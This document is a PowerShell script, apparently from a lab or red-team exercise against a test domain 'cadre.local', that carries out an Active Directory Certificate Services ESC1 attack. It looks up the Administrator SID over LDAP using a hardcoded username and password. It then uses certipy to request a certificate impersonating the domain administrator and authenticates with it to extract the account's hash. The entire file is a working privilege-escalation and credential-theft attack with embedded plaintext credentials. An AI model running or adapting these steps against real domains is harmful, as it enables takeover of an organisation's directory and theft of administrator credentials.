# T050 ESC1 - req with -sid (fix SID mismatch) + auth/UnPAC
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack

# 1. Get administrator objectSid via LDAP (chief_command creds)
$adminSid = $null
try {
  $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.77.10/CN=Administrator,CN=Users,DC=cadre,DC=local", "chief_command@cadre.local", "C0mm@nd_Ch1ef!")
  $de.RefreshCache()
  if ($de.Properties["objectSid"].Count -gt 0) {
    $adminSid = (New-Object System.Security.Principal.SecurityIdentifier($de.Properties["objectSid"][0],0)).Value
  }
} catch { Write-Output "ldap_err=$($_.Exception.Message)" }
Write-Output "administrator_sid=$adminSid"
if (-not $adminSid) { Write-Output "NO_SID"; exit 1 }

# 2. Re-request ESC1 cert with -sid
Remove-Item C:\Tools\cadre-attack\administrator.pfx -ErrorAction SilentlyContinue
& $certpy req -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC1 -upn administrator@cadre.local -sid $adminSid -dynamic-endpoint -timeout 20 -out C:\Tools\cadre-attack\esc1 2>&1 | Select-Object -Last 12
Write-Output "req_rc=$LASTEXITCODE"

# 3. Auth (UnPAC-the-hash)
$pfx = "C:\Tools\cadre-attack\esc1_administrator.pfx"
if (-not (Test-Path $pfx)) { $pfx = "C:\Tools\cadre-attack\administrator.pfx" }
if (Test-Path $pfx) {
  Write-Output "=== certipy auth ==="
  & $certpy auth -pfx $pfx -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 15
  Write-Output "auth_rc=$LASTEXITCODE"
} else { Write-Output "NO_PFX" }
Write-Output "=== ESC1_V2_DONE ==="
